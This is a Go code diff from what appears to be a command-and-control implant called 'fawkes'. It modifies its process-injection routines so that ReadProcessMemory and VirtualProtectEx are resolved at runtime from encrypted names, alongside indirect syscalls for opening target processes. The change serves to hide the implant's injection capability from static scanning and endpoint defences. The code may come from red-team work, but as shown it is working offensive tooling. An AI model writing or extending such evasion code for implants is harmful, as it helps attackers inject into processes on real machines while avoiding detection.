@@ -9,18 +9,33 @@ package commands
 
 import (
 	"fmt"
+	"sync"
+	"syscall"
 	"unsafe"
+
+	"fawkes/pkg/obfuscate"
 
 	"golang.org/x/sys/windows"
 )
 
+// Additional injection procs — resolved at runtime from encrypted names
 var (
-	procReadProcessMemoryHelper = kernel32.NewProc("ReadProcessMemory")
-	procVirtualProtectX         = kernel32.NewProc("VirtualProtectEx")
+	procReadProcessMemoryHelper *syscall.LazyProc
+	procVirtualProtectX         *syscall.LazyProc
+	initInjectionHelpers        sync.Once
 )
+
+func ensureInjectionHelpers() {
+	initInjectionHelpers.Do(func() {
+		ensureInjectionAPIs()
+		procReadProcessMemoryHelper = kernel32.NewProc(obfuscate.ReadProcessMemory())
+		procVirtualProtectX = kernel32.NewProc(obfuscate.VirtualProtectEx())
+	})
+}
 
 // injectOpenProcess opens a process handle, using indirect syscalls when available.
 func injectOpenProcess(desiredAccess uint32, pid uint32) (uintptr, error) {
+	ensureInjectionHelpers()
 	if IndirectSyscallsAvailable() {
 		var handle uintptr
 		status := IndirectNtOpenProcess(&handle, desiredAccess, uintptr(pid))
